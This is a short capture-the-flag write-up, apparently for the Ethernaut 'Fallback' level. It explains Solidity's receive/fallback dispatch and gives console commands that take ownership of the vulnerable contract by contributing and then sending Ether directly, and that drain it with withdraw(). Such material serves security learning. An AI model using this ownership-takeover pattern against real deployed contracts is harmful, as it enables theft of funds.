# 1. Fallback

## Key

> receive()
> executes on calls to the contract with no data (calldata), e.g. calls made via send() or transfer().
> https://blog.soliditylang.org/2020/03/26/fallback-receive-split/

```
Which function is called, fallback() or receive()?

           send Ether
               |
         msg.data is empty?
              / \
            yes  no
            /     \
receive() exists?  fallback()
         /   \
        yes   no
        /      \
    receive()   fallback()

https://solidity-by-example.org/sending-ether/
```

## Solution

1. Becoming `owner`
   Contribute:

```js
> await contract.contribute({from: '0x4545c437d127B29bF0BB080DeEe97f159AB827d8', to: '0x734db95b58736156903AFdb35F4eaEf0A60E866C', value: 1});
```

Call receive() "fallback":

```js
> await contract.sendTransaction({from: '0x4545c437d127B29bF0BB080DeEe97f159AB827d8', to: '0x734db95b58736156903AFdb35F4eaEf0A60E866C', value: 1});
```

2. Withdrawing balance to 0

```js
contract.withdraw();
```
